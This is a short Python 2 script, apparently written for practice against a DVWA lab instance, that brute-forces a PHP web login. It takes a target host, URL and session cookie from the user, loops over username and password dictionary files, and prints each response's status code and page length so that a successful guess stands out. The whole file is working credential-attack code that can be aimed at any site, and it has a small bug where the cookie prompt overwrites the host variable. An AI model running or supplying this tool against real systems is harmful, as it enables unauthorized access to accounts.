##simple brute force for a php website

import urllib2
import os

##default arguements
bsHost = "192.168.213.128"
bsUrl = "http://192.168.213.128/dvwa/vulnerabilities/brute/"
bsCookie = "security=high; PHPSESSID=7668a987c757d3300ec16df4ec43f2a1"
dict_user = ["admin"]
dict_password = ["123456"]
##get another target
bsHost = raw_input("Please input your target Host Ip ,\n  DEFAULT is "+bsHost+"\n:") or bsHost
bsUrl = raw_input("Please input your target Url  ,\n  DEFAULT is "+bsUrl+"\n:") or bsUrl
bsHost = raw_input("Please input your Cookie ,\n  DEFAULT is "+bsCookie+"\n:") or bsCookie
##use a dictionary
if (os.path.isfile("dict_user.txt")):
	dict_user = open("dict_user.txt") 
if (os.path.isfile("dict_password.txt")):
	dict_password = open("dict_password.txt") 
##make a HTTP request header
header={'Host': bsHost,
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'en-US,en;q=0.5',
	'Cookie': bsCookie}
##Reauest for the url ,print the status code and page length
##That request which has a different length maybe the right password
def get_res(requrl,header):
	req = urllib2.Request(url=requrl,headers=header)
	response = urllib2.urlopen(req)
	print response.getcode(),"\t",
	the_page = response.read()
	print len(the_page)

print "Use dictionary files named 'dict_user.txt' & 'dict_password.txt'"
print "IF NOT EXISTS, username='admin' & password='123456'"
raw_input() ##pause
i=0
j=0
print "i j username\tpassword\tres_code\tres_page_length"
##Try every the usernames and passwords 
for line_usr in dict_user:
	for line_pwd in dict_password:
		requrl = bsUrl+"?username="+line_usr.strip()+"&password="+line_pwd.strip()+"&Login=Login"
		j = j+1
		print i,j,line_usr.strip(),"\t",line_pwd.strip(),"\t",
		get_res(requrl,header)
##limit number 
#	if (i == 10):
#		break
